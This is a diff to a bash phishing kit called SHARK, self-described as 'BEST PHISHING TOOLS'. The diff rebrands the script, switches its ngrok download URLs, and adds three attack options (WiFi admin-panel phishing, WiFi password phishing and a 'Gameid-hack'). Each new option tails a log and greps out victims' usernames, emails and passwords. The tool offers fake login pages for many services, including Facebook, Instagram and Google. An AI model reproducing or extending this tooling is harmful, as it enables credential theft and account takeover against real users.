@@ -4,11 +4,11 @@
 #                                            #
 #             PROJECT: SHARK                 #
 #             AUTHOR: ASHISH                 #
-#              SHARK ©2020                   #
+#              SHARK ©2021                   #
 #     EMAIL: ashishsingh103020@gmail.com     #
 #           BEST PHISHING TOOLS              #              
 #       created by :- a s h i s h            #
-#                                            #
+#       Reborn by :- M r. D e r e K          #
 ##############################################
 
 #########
@@ -224,7 +224,11 @@ function fix_ngrok() {
 	if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			ngrok_url="https://github.com/tech2gamer/stuff/raw/main/ngrok-2in1.zip"
 		elif [[ "$arch" == *'aarch64'* ]]; then
-			ngrok_url="https://github.com/Linux-Droid/Ngrok/raw/master/Ngrok_Linux_Droid.zip"
+		         if [[ "$ArNam" == *'amd64'* ]]; then
+                              ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
+                        else
+                              ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip"
+		         fi
 		elif [[ "$arch" == *'x86_64'* ]]; then
 		         if [[ "$ArNam" == *'amd64'* ]]; then
                               ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
@@ -401,7 +405,7 @@ banner2() {
         Author    : ${white}Ashish Singh${green}
         Github    : ${white}github.com/Bhaviktutorials${green}   
         Publisher : ${white}Bhavik Oza${green}  
-	Reborn by : ${white}@tech2.gamer${green}
+	Reborn by : ${white}Mr.Derek(t2g)${green}
      
         >> ${white}${final_url}${green} 
                 	or
@@ -521,7 +525,7 @@ do
        ╚█████╗ ███████║███████║██████╔╝█████═╝${white}
         ╚═══██╗██╔══██║██╔══██║██╔══██╗██╔═██╗
        ██████╔╝██║  ██║██║  ██║██║  ██║██║ ╚██╗
-       ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ v ${VERSION}\n\n "
+       ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ v ${VERSION} ${yellow}Reborn by Mr.Derek(t2g) "
 
       printf "${green}      ╔──────────────────────────────────────╗\n"
       printf "${green}       |${white}    c r e a t e d  b y  a s h i s h ${green}  |\n"
@@ -529,9 +533,9 @@ do
 
      printf "           ${green}💻 \e[1;4;5;37mSelect An Attack To Deploy\e[0m${green} 💻\n\n"
 function banner(){	
-        printf "\e[1;92m[\e[0m\e[1;37m01\e[0m\e[1;92m] \e[0m\e[1;37;44mFacebook\e[0m           \e[1;92m[\e[0m\e[1;37m12\e[0m\e[1;92m] \e[0m\e[1;37;104mLinkedin\e[0m          \e[1;92m[\e[0m\e[1;37m23\e[0m\e[1;92m] \e[0m\e[1;37;44mWordpress\e[0m\n\n"
-        printf "\e[1;92m[\e[0m\e[1;37m02\e[0m\e[1;92m] \e[0m\e[1;37;41mPinterest\e[0m          \e[1;92m[\e[0m\e[1;37m13\e[0m\e[1;92m] \e[0m\e[1;37;46mHotstar\e[0m           \e[1;92m[\e[0m\e[1;37m24\e[0m\e[1;92m] \e[0m\e[1;37;43mSnapchat\e[0m\n\n" 
-        printf "\e[1;92m[\e[0m\e[1;37m03\e[0m\e[1;92m] \e[0m\e[1;48;5;200mInstagram\e[0m          \e[1;92m[\e[0m\e[1;37m14\e[0m\e[1;92m] \e[0m\e[1;37;42mSpotify\e[0m           \e[1;92m[\e[0m\e[1;37m25\e[0m\e[1;92m] \e[0m\e[1;37;40mProtonmail\e[0m\n\n"
+        printf "\e[1;92m[\e[0m\e[1;37m01\e[0m\e[1;92m] \e[0m\e[1;37;44mFacebook\e[0m           \e[1;92m[\e[0m\e[1;37m12\e[0m\e[1;92m] \e[0m\e[1;37;104mLinkedin\e[0m          \e[1;92m[\e[0m\e[1;37m23\e[0m\e[1;92m] \e[0m\e[1;37;44mWordpress\e[0m          \e[1;92m[\e[0m\e[1;37m33\e[0m\e[1;92m] \e[0m\e[1;37;46mWIFI-(adminpanel)\e[0m\n\n"
+        printf "\e[1;92m[\e[0m\e[1;37m02\e[0m\e[1;92m] \e[0m\e[1;37;41mPinterest\e[0m          \e[1;92m[\e[0m\e[1;37m13\e[0m\e[1;92m] \e[0m\e[1;37;46mHotstar\e[0m           \e[1;92m[\e[0m\e[1;37m24\e[0m\e[1;92m] \e[0m\e[1;37;43mSnapchat\e[0m           \e[1;92m[\e[0m\e[1;37m34\e[0m\e[1;92m] \e[0m\e[1;48;5;4mWIFI-(passwd)\e[0m\n\n"            
+        printf "\e[1;92m[\e[0m\e[1;37m03\e[0m\e[1;92m] \e[0m\e[1;48;5;200mInstagram\e[0m          \e[1;92m[\e[0m\e[1;37m14\e[0m\e[1;92m] \e[0m\e[1;37;42mSpotify\e[0m           \e[1;92m[\e[0m\e[1;37m25\e[0m\e[1;92m] \e[0m\e[1;37;40mProtonmail\e[0m         \e[1;92m[\e[0m\e[1;37m35\e[0m\e[1;92m] \e[0m\e[1;37;42mGameid-hack\e[0m\n\n"
         printf "\e[1;92m[\e[0m\e[1;37m04\e[0m\e[1;92m] \e[0m\e[1;37;40mUber \e[1;37;42mEats\e[0m          \e[1;92m[\e[0m\e[1;37m15\e[0m\e[1;92m] \e[0m\e[1;37;40mGithub\e[0m            \e[1;92m[\e[0m\e[1;37m26\e[0m\e[1;92m] \e[0m\e[1;38;5;209m\e[40mStackoverflow\e[0m\n\n" 
         printf "\e[1;92m[\e[0m\e[1;37m05\e[0m\e[1;92m] \e[0m\e[1;93;40mOLA\e[0m                \e[1;92m[\e[0m\e[1;37m16\e[0m\e[1;92m] \e[0m\e[1;37;43mIPFinder\e[0m          \e[1;92m[\e[0m\e[1;37m27\e[0m\e[1;92m] \e[0m\e[1;40m\e[91mE\e[94mb\e[93ma\e[92my\e[0m\n\n"  
         printf "\e[1;92m[\e[0m\e[1;37m06\e[0m\e[1;92m] \e[0m\e[1;40m\e[94mG\e[91mO\e[93mO\e[94mG\e[92mL\e[91mE\e[0m             \e[1;92m[\e[0m\e[1;37m17\e[0m\e[1;92m] \e[0m\e[1;37;101mZomato\e[0m            \e[1;92m[\e[0m\e[1;37m28\e[0m\e[1;92m] \e[0m\e[1;48;5;129mTwitch\e[0m\n\n"           
@@ -738,10 +742,28 @@ function banner(){
 		cd $phish/Audio_hack && file_check
                 audio_hack
 		break;
-			   
-	elif [ $option = 99 ];then		
-		printf "\n" && exit 
-		break;
+
+        elif [ $option = 33 ];then		
+                cd $phish/wiapp/ && main
+                credentials
+                tail -f log.txt | grep -e "Username:" -e "Password:"
+                break;
+        
+        elif [ $option = 34 ];then		
+                cd $phish/wip/ && main
+                credentials
+                tail -f log.txt | grep -e "Password:"
+                break;
+        
+        elif [ $option = 35 ];then		
+                cd $phish/gidp/ && main
+                credentials
+                tail -f log.txt | grep -e "Game:" -e "Email:" -e "Password:"
+                break;
+        
+        elif [ $option = 99 ];then
+                printf "\n" && exit
+                break;
 
 	else		
 		printf "\n${green}[${yellow}!${green}${red} Invalid option Try Again !!${white}\n"
